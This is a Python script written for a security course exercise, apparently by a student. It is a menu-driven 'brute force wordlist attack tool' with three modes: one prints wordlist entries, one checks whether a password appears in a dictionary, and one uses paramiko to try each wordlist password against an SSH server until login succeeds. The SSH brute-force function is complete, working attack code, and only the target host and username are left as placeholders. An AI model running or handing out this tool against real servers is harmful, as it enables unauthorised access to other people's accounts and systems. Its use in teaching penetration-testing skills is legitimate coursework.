#!/user/bin/python3
# Script: Ops 401 Class 16 Code Challenge
# Joshua Phipps
# 5/9/2023
# Purpose: Automated Brute Force Wordlist Attack Tool Part 2 of 3

import getpass, os, time, paramiko, sys

# Define global variables
host = "your ssh host"
port = 22
username = "your ssh username"
global_file_path = r"rockyoufilepath"

# Mode 1
def iterator():
    # Accepts a user input word list file path and iterates through the word list, assigning the word being read to a variable.
    global global_file_path
    # Open file
    with open(global_file_path) as file:
        for word in file:
            print(word.strip())
            # Add a delay between words.
            time.sleep(1)

# # Mode 2: Defensive; Password Recognized
def check_password():
    # Accepts a user input string.
    user_password = input("Enter password to check:\n")
    # Accepts a user input word list file path.
    dictionary_path = input("Enter dictionary filepath:\n")
    # Search the word list for the user input string.
    password_found = False
    with open(dictionary_path) as file:
        for word in file:
            if word.strip() == user_password:
                print("You in DANGA, yo password is weak!")
                password_found = True
                break

def connect_to_SSH():
  # setup the SSHClient
  sshConnection = paramiko.SSHClient()
  # Auto-add host-key policy!
  sshConnection.set_missing_host_key_policy(paramiko.AutoAddPolicy)
  # Open file containing password list.
  with open(global_file_path, "r") as file:
      # Iterate through password list.
      for password in file:
          password = password.strip()
          try:
              # Attempt to connect to SSH server with current password.
              sshConnection.connect(host, port, username, password)
              print("Successfully authenticated to the SSH server!")
              # Close SSH connection.
              sshConnection.close()
              return

          except paramiko.AuthenticationException:
              print(f"Failed to authenticate with password: {password}")
          except KeyboardInterrupt:
              print("\n\n[*] User requested an interrupt.")
              sys.exit() # this is Ctrl + C
          
  # If no password worked, print message.
  print("Could not find the correct password in the provided wordlist.")

# Prompt the user to select a mode
while True:
    mode = input("""
Brute Force Wordlist Attack Tool Menu
1 - Offensive, Dictionary Iterator
2 - Defensive, Password Recognized
3 - Brute Force SSH Server
4 - Exit
Please enter a number: """)
    if (mode == "1"):
        iterator()
    elif (mode == "2"):
        check_password()
    elif (mode == '3'):
        connect_to_SSH()
    elif (mode == '4'):
        break
    else:
        print("Invalid selection...")
